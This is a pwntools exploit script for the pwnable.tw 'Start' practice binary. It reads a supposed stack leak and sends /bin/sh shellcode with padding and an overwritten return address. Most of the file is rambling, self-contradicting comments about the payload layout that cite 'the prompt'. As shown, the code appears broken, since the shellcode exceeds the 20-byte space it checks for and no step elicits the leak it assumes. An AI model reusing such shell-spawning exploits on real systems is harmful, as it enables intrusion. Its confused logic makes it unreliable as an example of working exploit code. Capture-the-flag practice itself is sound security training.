
from pwn import *

binary_path = './samples/PwnableTW/Start/start'
p = process(binary_path)

# Receive the initial 20 bytes, which includes the stack leak
log.info("Receiving initial 20 bytes...")
output = p.recv(20)
log.info(f"Received: {output}")

# Extract the 4-byte address at offset 16
leaked_addr = u32(output[16:20])
log.info(f"Leaked stack address: {hex(leaked_addr)}")

# Craft the shellcode
shellcode = asm(shellcraft.sh())

# Payload structure: shellcode + padding + leaked_addr (return address)
# The program reads 60 bytes.
# Shellcode at the start, then padding to reach offset 20 (where the return address is overwritten)
# The leaked address is the return address.
# The total payload size should be 60 bytes.
# Shellcode length + padding length + 4 (for leaked_addr) = 60
# If shellcode is 24 bytes, then 24 + padding + 4 = 60 => padding = 32 bytes.
# The problem states "padding to 20 bytes", which implies the shellcode + padding should be 20 bytes,
# and then the leaked address. This means the shellcode is placed at the beginning of the buffer,
# and the return address (leaked_addr) is placed at offset 20.
# So, shellcode + (20 - len(shellcode)) * b'A' + p32(leaked_addr)

# Let's re-evaluate the padding based on the prompt:
# "Shellcode at start of buffer, padding to 20 bytes, then p32(leaked_addr) as return address."
# This means the shellcode is at offset 0.
# The return address is at offset 20.
# So, we need to fill the first 20 bytes with shellcode and padding.
# Then, at offset 20, we put the leaked address.
# The total buffer size is 60 bytes.
# So, the payload will be: shellcode + (20 - len(shellcode)) * b'A' + p32(leaked_addr) + (60 - 24) * b'B' (remaining buffer)
# However, the prompt implies the return address is at offset 20, and the total input is 60 bytes.
# So, the payload should be: shellcode + padding_to_20_bytes + p32(leaked_addr)
# The total length of this part is len(shellcode) + padding_len + 4.
# The program reads 60 bytes. So, we can send up to 60 bytes.
# If the return address is at offset 20, then the first 20 bytes are for shellcode/padding.
# And the next 4 bytes are for the return address.
# So, the payload should be: shellcode + (20 - len(shellcode)) * b'A' + p32(leaked_addr)

# Let's assume the stack layout is:
# [shellcode] [padding] [leaked_addr (EIP)] [more padding to fill 60 bytes]
# The prompt says "padding to 20 bytes", which means the shellcode + padding should occupy the first 20 bytes.
# Then the return address (leaked_addr) is at offset 20.

padding_length = 20 - len(shellcode)
if padding_length < 0:
    log.error("Shellcode is too long for the initial 20 bytes.")
    exit()

payload = shellcode + b'A' * padding_length + p32(leaked_addr)

log.info(f"Payload length: {len(payload)}")
log.info(f"Sending payload: {payload}")
p.send(payload)

# Receive output from the shell for a few seconds
log.info("Receiving shell output...")
try:
    shell_output = p.recv(timeout=3)
    log.info(f"Shell output: {shell_output.decode(errors='ignore')}")
except EOFError:
    log.info("No more output from shell (EOF).")

p.close()
